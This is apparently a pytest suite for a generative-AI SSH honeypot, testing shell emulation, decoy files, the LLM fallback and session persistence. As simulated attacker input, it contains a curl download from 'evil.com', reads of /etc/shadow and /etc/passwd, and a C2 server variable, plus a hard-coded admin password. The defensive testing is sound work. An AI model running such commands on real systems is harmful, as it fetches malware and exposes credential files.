"""
Unit & Integration Tests for Module 1: Generative AI Honeypot Core (shelLM)
Tests:
1. Session state initialization and environment setup
2. Context persistence across sequential commands (cd, pwd, ls)
3. Virtual filesystem mutations (touch, echo >, echo >>, cat, rm)
4. Environment variable export and substitution ($VAR)
5. Command history tracking
6. Decoy system files and Linux reconnaissance commands
7. Ollama LLM provider integration with markdown fence cleaning
8. Graceful deterministic fallback when Ollama is offline or times out
9. Database persistence of sessions, terminal events, threats, and metadata
10. Honeypot API endpoints and session reset
"""

import pytest
import uuid
from unittest.mock import AsyncMock, patch
from sqlalchemy import select

from app.services.generative_honeypot import (
    HoneypotSessionState,
    stateful_fallback_emulate,
    GenerativeHoneypotEngine,
    generative_honeypot_engine,
    state_manager,
)
from app.agents.honeypot_agent import record_honeypot_interaction
from app.models.security_entities import HoneypotSession, TerminalEvent, Threat, MitreTechnique
from app.database.postgres import async_session_factory, init_postgres


@pytest.mark.asyncio
async def test_session_state_initialization():
    """Verify default session state configuration."""
    session = HoneypotSessionState(session_id="test-sess-01", username="root", cwd="/root")
    assert session.session_id == "test-sess-01"
    assert session.username == "root"
    assert session.cwd == "/root"
    assert session.env["USER"] == "root"
    assert session.env["HOME"] == "/root"
    assert session.env["PWD"] == "/root"
    assert len(session.virtual_files) == 0


@pytest.mark.asyncio
async def test_cwd_navigation_and_persistence():
    """Verify that cd persists cwd and affects subsequent pwd and relative paths."""
    session = HoneypotSessionState(session_id="test-sess-nav", username="root", cwd="/root")

    # Command 1: pwd initially returns /root
    out_pwd1 = stateful_fallback_emulate(session, "pwd")
    assert out_pwd1 == "/root"

    # Command 2: cd /tmp
    out_cd1 = stateful_fallback_emulate(session, "cd /tmp")
    assert out_cd1 == ""  # unix silent success
    assert session.cwd == "/tmp"

    # Command 3: pwd now returns /tmp
    out_pwd2 = stateful_fallback_emulate(session, "pwd")
    assert out_pwd2 == "/tmp"

    # Command 4: cd /var/log
    stateful_fallback_emulate(session, "cd /var/log")
    assert session.cwd == "/var/log"

    # Command 5: cd .. moves to /var
    stateful_fallback_emulate(session, "cd ..")
    assert session.cwd == "/var"

    # Command 6: cd ~ moves to /root
    stateful_fallback_emulate(session, "cd ~")
    assert session.cwd == "/root"

    # Command 7: cd to non-existent directory errors out and retains cwd
    err_cd = stateful_fallback_emulate(session, "cd /nonexistent_folder_xyz")
    assert "No such file or directory" in err_cd
    assert session.cwd == "/root"


@pytest.mark.asyncio
async def test_virtual_filesystem_mutations():
    """Verify stateful file creation, modification, listing, and deletion."""
    session = HoneypotSessionState(session_id="test-sess-fs", username="root", cwd="/root")

    # Navigate to /tmp
    stateful_fallback_emulate(session, "cd /tmp")

    # 1. Create file with touch
    touch_out = stateful_fallback_emulate(session, "touch payload.sh")
    assert touch_out == ""
    assert session.file_exists("/tmp/payload.sh")

    # 2. List /tmp - should include payload.sh
    ls_out = stateful_fallback_emulate(session, "ls")
    assert "payload.sh" in ls_out

    # 3. Write content with echo >
    stateful_fallback_emulate(session, 'echo "#!/bin/bash" > payload.sh')
    cat_out1 = stateful_fallback_emulate(session, "cat payload.sh")
    assert "#!/bin/bash" in cat_out1

    # 4. Append content with echo >>
    stateful_fallback_emulate(session, 'echo "whoami" >> payload.sh')
    cat_out2 = stateful_fallback_emulate(session, "cat payload.sh")
    assert "#!/bin/bash" in cat_out2
    assert "whoami" in cat_out2

    # 5. Remove file
    stateful_fallback_emulate(session, "rm payload.sh")
    assert not session.file_exists("/tmp/payload.sh")
    cat_out3 = stateful_fallback_emulate(session, "cat payload.sh")
    assert "No such file or directory" in cat_out3


@pytest.mark.asyncio
async def test_environment_variable_export_and_substitution():
    """Verify export modifies session environment and echo evaluates variables."""
    session = HoneypotSessionState(session_id="test-sess-env", username="root", cwd="/root")

    stateful_fallback_emulate(session, "export C2_SERVER=198.51.100.24")
    assert session.env["C2_SERVER"] == "198.51.100.24"

    echo_out = stateful_fallback_emulate(session, "echo $C2_SERVER")
    assert echo_out == "198.51.100.24"

    env_out = stateful_fallback_emulate(session, "env")
    assert "C2_SERVER=198.51.100.24" in env_out


@pytest.mark.asyncio
async def test_command_history_tracking():
    """Verify commands are logged to history and returned by history command."""
    session = HoneypotSessionState(session_id="test-sess-hist", username="root", cwd="/root")

    commands = ["whoami", "uname -a", "cd /tmp", "pwd"]
    for cmd in commands:
        resp = stateful_fallback_emulate(session, cmd)
        session.add_history(cmd, resp, "test")

    hist_out = stateful_fallback_emulate(session, "history")
    for cmd in commands:
        assert cmd in hist_out


@pytest.mark.asyncio
async def test_decoy_system_files_and_linux_profiling():
    """Verify realistic Linux shell reconnaissance output."""
    session = HoneypotSessionState(session_id="test-sess-recon", username="root", cwd="/root")

    assert stateful_fallback_emulate(session, "whoami") == "root"
    assert "uid=0(root)" in stateful_fallback_emulate(session, "id")
    assert "Ubuntu" in stateful_fallback_emulate(session, "uname -a")
    assert "root:x:0:0:root:" in stateful_fallback_emulate(session, "cat /etc/passwd")
    assert "root:$6$rounds=" in stateful_fallback_emulate(session, "cat /etc/shadow")
    assert "Ubuntu 22.04" in stateful_fallback_emulate(session, "cat /etc/os-release")
    assert "(ALL : ALL) ALL" in stateful_fallback_emulate(session, "sudo -l")

    # Decoy trap for downloads
    curl_out = stateful_fallback_emulate(session, "curl http://evil.com/malware.elf")
    assert "TRAPPED" in curl_out


@pytest.mark.asyncio
async def test_ollama_engine_with_mocked_llm():
    """Verify Ollama integration sanitizes markdown code fences and syncs state."""
    engine = GenerativeHoneypotEngine()
    session_id = f"test-llm-{uuid.uuid4().hex[:6]}"

    mock_llm_response = "```bash\nLinux lab-honeypot-01 5.15.0-89-generic x86_64\n```"

    with patch.object(engine, "_query_ollama", new_callable=AsyncMock) as mock_query:
        mock_query.return_value = engine._clean_llm_output(mock_llm_response)

        result = await engine.execute_shell_command(
            session_id=session_id,
            command="uname -a",
            attacker_ip="10.0.1.105",
        )

        assert "Linux lab-honeypot-01" in result["response"]
        assert "```" not in result["response"]
        assert "ollama" in result["engine_used"]


@pytest.mark.asyncio
async def test_deterministic_fallback_when_ollama_offline():
    """Verify fallback executes stateful commands seamlessly when Ollama returns None."""
    engine = GenerativeHoneypotEngine()
    session_id = f"test-fallback-{uuid.uuid4().hex[:6]}"

    with patch.object(engine, "_query_ollama", new_callable=AsyncMock) as mock_query:
        mock_query.return_value = None  # simulate Ollama offline

        # Sequential command 1: cd /tmp
        res1 = await engine.execute_shell_command(session_id=session_id, command="cd /tmp")
        assert res1["cwd"] == "/tmp"
        assert res1["engine_used"] == "deterministic_fallback"

        # Sequential command 2: pwd
        res2 = await engine.execute_shell_command(session_id=session_id, command="pwd")
        assert res2["response"] == "/tmp"
        assert res2["cwd"] == "/tmp"


@pytest.mark.asyncio
async def test_record_honeypot_interaction_db_persistence():
    """Verify database persistence of honeypot sessions, terminal events, and metadata."""
    await init_postgres()
    session_id = str(uuid.uuid4())

    async with async_session_factory() as db:
        # Command 1: cd /tmp
        res1 = await record_honeypot_interaction(
            db=db,
            session_id=session_id,
            command="cd /tmp",
            attacker_ip="192.168.1.99",
        )
        assert res1["cwd"] == "/tmp"

        # Command 2: touch test_malware.py
        res2 = await record_honeypot_interaction(
            db=db,
            session_id=session_id,
            command="touch test_malware.py",
            attacker_ip="192.168.1.99",
        )
        assert res2["cwd"] == "/tmp"

        # Verify DB records
        sess_query = await db.execute(select(HoneypotSession).where(HoneypotSession.id == session_id))
        hp_sess = sess_query.scalar_one()
        assert hp_sess.command_count == 2
        assert hp_sess.session_metadata is not None
        assert hp_sess.session_metadata["cwd"] == "/tmp"

        # Verify TerminalEvents
        events_query = await db.execute(
            select(TerminalEvent).where(TerminalEvent.session_id == session_id)
        )
        events = events_query.scalars().all()
        assert len(events) == 2


from httpx import AsyncClient, ASGITransport
from app.main import app


@pytest.mark.asyncio
async def test_honeypot_api_endpoints():
    """Verify FastAPI honeypot endpoints including simulate-command and reset."""
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # 1. Login to get auth token
        login_res = await client.post(
            "/api/auth/login",
            json={"username": "admin", "password": "CyberaryAdmin123!"},
        )
        assert login_res.status_code == 200
        token = login_res.json()["data"]["access_token"]
        headers = {"Authorization": f"Bearer {token}"}

        session_id = str(uuid.uuid4())

        # 2. Simulate command 1: cd /var/log
        sim_res1 = await client.post(
            "/api/honeypot/simulate-command",
            headers=headers,
            json={"session_id": session_id, "command": "cd /var/log", "attacker_ip": "10.0.1.55"},
        )
        assert sim_res1.status_code == 200
        data1 = sim_res1.json()["data"]
        assert data1["cwd"] == "/var/log"

        # 3. Simulate command 2: pwd (context must persist)
        sim_res2 = await client.post(
            "/api/honeypot/simulate-command",
            headers=headers,
            json={"session_id": session_id, "command": "pwd", "attacker_ip": "10.0.1.55"},
        )
        assert sim_res2.status_code == 200
        data2 = sim_res2.json()["data"]
        assert data2["response"] == "/var/log"

        # 4. Get session detail
        detail_res = await client.get(f"/api/honeypot/sessions/{session_id}", headers=headers)
        assert detail_res.status_code == 200
        detail_data = detail_res.json()["data"]
        assert len(detail_data["timeline"]) == 2
        assert detail_data["session_metadata"]["cwd"] == "/var/log"

        # 5. Reset session
        reset_res = await client.post(f"/api/honeypot/sessions/{session_id}/reset", headers=headers)
        assert reset_res.status_code == 200
        reset_data = reset_res.json()["data"]
        assert reset_data["session_metadata"]["cwd"] == "/root"
